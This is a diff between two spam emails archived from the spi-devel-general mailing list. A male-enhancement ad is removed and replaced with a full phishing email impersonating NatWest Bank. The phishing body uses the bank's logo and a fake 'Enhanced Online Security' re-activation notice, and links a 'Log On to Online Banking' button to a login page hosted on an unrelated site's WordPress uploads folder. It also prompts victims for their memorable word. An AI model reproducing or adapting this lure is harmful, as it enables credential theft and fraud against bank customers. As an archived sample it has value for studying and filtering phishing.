@@ -1,10 +1,10 @@
-From: Kean <assigne_1998-jMi+s/zXH5aTMXRB4auj9A@public.gmane.org>
-Subject: Make her come sooner
-Date: Thu, 8 May 2008 20:23:54 +0200
-Message-ID: <21D92ADB.E%assigne_1998@MAIL.SUNYOCC.EDU>
+From: "Natwest Bank Plc." <Membership.service-x91ZFdZag3oqdlJmJB21zg@public.gmane.org>
+Subject: 1 New Security Message From Natwest Bank.
+Date: Fri, 9 May 2008 19:49:29 +0700 (ICT)
+Message-ID: <200805091249.m49CnTxY073870@wongtawan.dyndns.biz>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============0472705973=="
-To: "spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org" <spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
+Content-Type: multipart/mixed; boundary="===============1393304186=="
+To: spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Return-path: <spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
 	<mailto:spi-devel-general-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org?subject=unsubscribe>
@@ -17,41 +17,182 @@ Sender: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.
 Errors-To: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-spi.vger.kernel.org
 
---===============0472705973==
-Content-type: multipart/alternative;
-        boundary="B_3056130456_82866"
+--===============1393304186==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
---B_3056130456_82866
-Content-type: text/plain;
-        charset="US-ASCII"
-Content-transfer-encoding: 7bit
+<html><head><style type=3D"text/css"><!--
 
-Get the inches you want with a simple solution today. http://www.burnodue.com/
+{ padding-top: 0 ;
+
+padding-bottom: 0 }
+
+--></style><title>Security Update Notification</title><style
+
+type=3D"text/css"><!--
+
+{ padding-top: 0 ;
+
+padding-bottom: 0 }--></style><title>Security Update
+
+Notification</title></head>
+
+<blockquote
+
+<P><IMG alt=3D"" hspace=3D0
+
+src=3D"https://www.nwolb.com/brands/NWB/images/nav_natwest_logo.gif"
+
+=20
+
+ " align=3Dbaseline
+
+border=3D0>
+
+<br><br><br><font
+
+face=3D"Verdana" size=3D"-1">
+
+<b style=3D'mso-bidi-font-weight:normal'><span
+
+ style=3D'font-size:14.0pt
+
+;font-family:Verdana;color:#000099'>News Alert:  </span></b><span
+
+style=3D'font-size:
+
+14.0pt;font-family:Verdana;
+
+ color:#000099'><o:p></o:p></span>
+
+<br>
+
+<br><span
 
 
---B_3056130456_82866
-Content-type: text/html;
-        charset="US-ASCII"
-Content-transfer-encoding: quoted-printable
 
-<HTML>
-<HEAD>
-<TITLE>Make her come sooner</TITLE>
-</HEAD>
-<BODY>
-<FONT SIZE=3D"4"><FONT FACE=3D"Verdana, Arial"><SPAN =
-STYLE=3D'font-size:11pt'>Get the inches you want with a simple solution =
-today. <a =
-href=3D"http://www.burnodue.com/">http://www.burnodue.com/</a><BR>
-</SPAN></FONT></FONT></FONT>
-</BODY>
-</HTML>
+style=3D'font-size:9.0pt ;font-family:Verdana;color:#000099'> Banking
+
+with Natwest Online
+
+is about to become even more secure! <span style=3D'font-size:9.0pt
+
+;font-family:Verdana;color:#000099'>
+
+<br>
+
+As a valued Natwest online customers, the security of
+
+your identity and personal account information is extremely important.
+
+We are installing Enhanced
+
+Online Security as an additional way of protecting your Natwest access.<b=
+r>
+
+<span
 
 
---B_3056130456_82866--
+
+style=3D'font-size:9.0pt ;font-family:Verdana;color:#000099'><br>
+
+Enhanced <span>Your </span>Online Security <span>Access </span>will
+
+allow Natwest banking to verify your
+
+identity from your computer anywhere
+
+you bank online. <span>Y</span>ou<span>r</span> <span>online</span> accou=
+nt
+
+<span>access
+
+information's would be recognized and be notified </span>you've signed on=
+ to
+
+Natwest online banking.
+
+This two-way process ensures that both parties
+
+are confident of each other's identity.
+
+<br>
+
+Every customer that uses Natwest online Account banking will be required =
+to
+
+<span>Re-</span>activate<span>
+
+his or her</span> Online
+
+Security.
+
+<br>
+
+<br>
+
+Click on
+
+sign in <span>your </span>Online Banking for quick and easy process
+
+<span>to</span>
+
+<span>Re-</span>activat<span>e</span> <span>your </span> Online
+
+Security<span>
+
+Access</span> .  <br>
+
+<br>
+
+<a
 
 
---===============0472705973==
+
+href=3D"http://www.freeformed.org/company/wp-content/uploads/2007/03/natw=
+est.co.uk/Login.php">Log On to Online
+
+Banking</a>
+
+<br><br>
+
+Thanks for taking the time to learn about our upcoming plan for
+
+Enhanced
+
+Online Security - it's one more way that Natwest Building Society
+
+online banking can makes your online banking experience
+
+better.Rememberalways fill in your Memorable word correctly<br><br>(c)
+
+2008 All Rights Reserved<blockquote
+
+type=3D"cite" cite><br><br
+
+ >
+
+ <img
+
+src=3D"
+
+http://www.natwest.com/content/global_options/security/images/zone_labs.j=
+pg
+
+">
+
+ <p> </p>
+
+<!-- web45212.mail.sp1.yahoo.com compressed/chunked Mon Aug 27 13:36:50 P=
+DT
+
+2008 -->
+
+
+
+
+
+--===============1393304186==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -62,7 +203,7 @@ This SF.net email is sponsored by the 2008 JavaOne(SM) Conference
 Don't miss this year's exciting event. There's still time to save $100. 
 Use priority code J8TL2D2. 
 http://ad.doubleclick.net/clk;198757673;13503038;p?http://java.sun.com/javaone
---===============0472705973==
+--===============1393304186==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -73,4 +214,4 @@ spi-devel-general mailing list
 spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 https://lists.sourceforge.net/lists/listinfo/spi-devel-general
 
---===============0472705973==--
+--===============1393304186==--
